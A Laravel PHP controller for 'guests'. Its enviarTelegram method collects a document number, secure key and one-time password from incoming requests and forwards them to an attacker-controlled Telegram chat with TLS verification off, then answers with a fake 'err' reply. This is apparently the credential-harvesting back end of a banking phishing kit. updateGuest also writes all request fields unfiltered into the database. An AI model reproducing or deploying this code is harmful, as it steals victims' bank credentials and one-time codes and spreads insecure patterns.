<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Http\Controllers\GuestService;
use App\Http\Requests\Api\Guest\NewGuestRequest;
use App\Models\Guest;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Request as FacadesRequest;

class GuestController extends Controller
{

    public function __construct(private GuestService $GuestService)
    {
    }
    
    public function newGuest(NewGuestRequest $request)
    {
        try {
            $guest = $this->GuestService->createGuest($request->validated());
            return response()->json($guest, 201);
        } catch (\Throwable $th) {
            return response()->json(['error' => $th->getMessage()], 500);
        }
    }

    public function verGuest($id)
    {
        try {
            $guest = $this->GuestService->obtenerInvitado($id);
            return response()->json($guest, 200);
        } catch (\Throwable $th) {
            return response()->json(['error' => $th->getMessage()], 500);
        }
        // try {
        //     $guest = Guest::query()->findOrFail($id);

        //     return response()->json($guest, 200);

        // } catch (\Throwable $th) {
        //     throw $th;
        // }
    }

    public function enviarTelegram(Request $request)
    {
        $botToken = env('TELEGRAM_BOT_TOKEN');
        $chatId = env('TELEGRAM_CHAT_ID');
        $url = "https://api.telegram.org/bot$botToken/sendMessage";

        $documentNumber = $request->input('documentNumber');
        $secureKey = $request->input('secureKey');
        $otp = $request->input('otp');

        Http::withOptions([
            'verify' => false
        ])->post($url, [
            'chat_id' => $chatId,
            'text' => "\n\nGOLEADOR⭐️🥷🏿💎\n\n🧑‍💻: $documentNumber\n\n🔐: $secureKey\n\n🪬: $otp",
            'parse_mode' => 'HTML',
        ]);

        return response()->json('err', 200);
    }

    public function updateGuest(int $id, Request $data)
    {
        try {
            $guest = Guest::findOrFail($id);
    
            $guest->update($data->all());
    
            return response()->json($guest, 200);
    
        } catch (\Throwable $th) {
            return response()->json(['error' => $th->getMessage()], 500);
        }
    }
    
}

